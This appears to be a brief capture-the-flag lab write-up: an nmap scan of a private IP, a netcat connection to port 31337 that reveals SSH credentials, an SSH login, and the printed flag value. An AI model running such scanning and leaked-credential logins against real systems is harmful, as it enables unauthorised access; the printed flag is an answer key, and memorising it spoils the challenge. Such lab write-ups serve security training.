## nmap scan
nmap -p- -sC -sC -O -T 4 10.82.163.235

    PORT      STATE SERVICE
    22/tcp    open  ssh
    | ssh-hostkey: 
    |   3072 7d:dc:eb:90:e4:af:33:d9:9f:0b:21:9a:fc:d5:77:f2 (RSA)
    |   256 83:a7:4a:61:ef:93:a3:57:1a:57:38:5c:48:2a:eb:16 (ECDSA)
    |_  256 30:bf:ef:94:08:86:07:00:f7:fc:df:e8:ed:fe:07:af (ED25519)
    2222/tcp  open  EtherNetIP-1
    | ssh-hostkey: 
    |   3072 91:db:63:3e:ea:b6:70:e1:e2:d6:9b:06:25:16:22:33 (RSA)
    |   256 f6:7f:2a:7b:1d:10:b2:79:21:cb:e5:30:11:a7:84:5a (ECDSA)
    |_  256 83:31:83:f0:17:ab:d5:0d:b0:ae:6b:39:cb:ee:22:53 (ED25519)
    31337/tcp open  Elite
    Device type: general purpose|router
    Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
    OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

## getting the ssh password
nc 10.82.163.235 31337
    
    In case I forget - user:pass
    ubuntu:Dafdas!!/str0ng

## login in via ssh user ubuntu
    ssh ubuntu@10.82.163.235

## getting the flag
    $ cd /home
    $ ls
    ubuntu	user
    $ cd user
    $ ls
    flag.txt
    $ cat flag.txt
    flag{251f309497a18888dde5222761ea88e4}$ 


$ cat flag.txt
flag{251f309497a18888dde5222761ea88e4}$ 
